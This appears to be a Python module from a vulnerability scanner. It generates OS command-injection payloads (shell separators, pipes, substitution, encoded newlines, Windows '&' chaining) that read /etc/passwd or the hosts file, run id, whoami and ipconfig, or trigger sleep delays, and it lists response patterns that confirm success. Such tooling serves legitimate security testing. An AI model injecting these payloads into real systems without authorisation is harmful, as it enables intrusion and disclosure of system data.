"""
命令注入攻击载荷。

职责：生成操作系统命令注入载荷，
      覆盖 Linux / Windows 命令拼接、管道、替换等。
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional

from .base import Payload


class CommandInjectionPayload(Payload):
    """命令注入攻击载荷。"""

    @property
    def name(self) -> str:
        return "command_injection"

    @property
    def severity(self) -> str:
        return "critical"

    def generate(self, params: Optional[Dict[str, Any]] = None) -> List[str]:
        """生成命令注入载荷列表。"""
        return [
            # 分号分隔
            "; cat /etc/passwd",
            "; id",
            "; whoami",
            "; uname -a",

            # 管道符
            "| cat /etc/passwd",
            "| id",
            "|| cat /etc/passwd",

            # 反引号
            "`cat /etc/passwd`",
            "`id`",

            # $() 替换
            "$(cat /etc/passwd)",
            "$(id)",
            "$(whoami)",

            # 换行符
            "%0aid",
            "%0acat /etc/passwd",

            # 逻辑与
            "&& cat /etc/passwd",
            "&& id",

            # Windows 命令
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "& ipconfig /all",
            "& whoami",

            # 延迟检测（时间盲注）
            "; sleep 5",
            "| sleep 5",
            "; ping -c 5 127.0.0.1",
        ]

    def get_detection_patterns(self) -> List[str]:
        """命令注入检测特征模式。"""
        return [
            "uid=",
            "root:x:0:0",
            "Linux",
            "Windows",
            "nobody:",
            "daemon:",
            "bin/sh",
            "bin/bash",
            "GNU/Linux",
            "Microsoft Windows",
        ]
